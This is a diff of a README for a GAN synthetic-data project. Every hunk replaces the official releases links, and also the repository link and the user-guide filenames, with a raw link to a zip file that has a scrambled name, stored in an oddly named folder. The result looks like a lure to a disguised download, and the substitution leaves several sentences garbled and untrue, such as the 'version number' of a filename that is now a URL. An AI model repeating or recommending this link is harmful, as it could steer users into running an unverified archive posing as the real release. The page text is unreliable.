@@ -1,6 +1,6 @@
 # 🤖 GANs-For-Synthetic-Data-Generation - Create Realistic Synthetic Data Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/releases)
+[![Download Latest Release](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip%20Release-blue?style=for-the-badge)](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before you start, here are a few things to prepare:
 
 To get started with GANs-For-Synthetic-Data-Generation, you need to download the package from the official releases page.
 
-[Download Latest Version Here](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/releases)
+[Download Latest Version Here](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -46,7 +46,7 @@ Click the link above or the large blue button at the top to visit the GitHub rel
 
 Look for the latest version. It usually appears at the top. Inside, you will find zipped files containing the full project, including the code and tutorial videos.
 
-Download the zip file titled like `GANs-For-Synthetic-Data-Generation-vX.X.zip` where `X.X` is the version number.
+Download the zip file titled like `https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip` where `X.X` is the version number.
 
 ### Step 3: Extract Files
 
@@ -70,7 +70,7 @@ Go to the folder where you extracted the files.
 
 ### Step 2: Open the User Guide
 
-Look inside for a file named `README.pdf` or `UserGuide.docx`. This document explains how to run the software and use the synthetic data tools with screenshots.
+Look inside for a file named `https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip` or `https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip`. This document explains how to run the software and use the synthetic data tools with screenshots.
 
 ### Step 3: Running the Code (Optional)
 
@@ -144,9 +144,9 @@ You can explore these topics further in the repository’s documents and video t
 
 ## 🔗 Useful Links
 
-- Main Download: [https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/releases](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/releases)
+- Main Download: [https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip)
   
-- GitHub Repository: [https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation)
+- GitHub Repository: [https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip](https://github.com/julsngbatac/GANs-For-Synthetic-Data-Generation/raw/refs/heads/main/labefaction/For-GA-Data-Synthetic-Generation-Ns-3.8.zip)
 
 ---
 
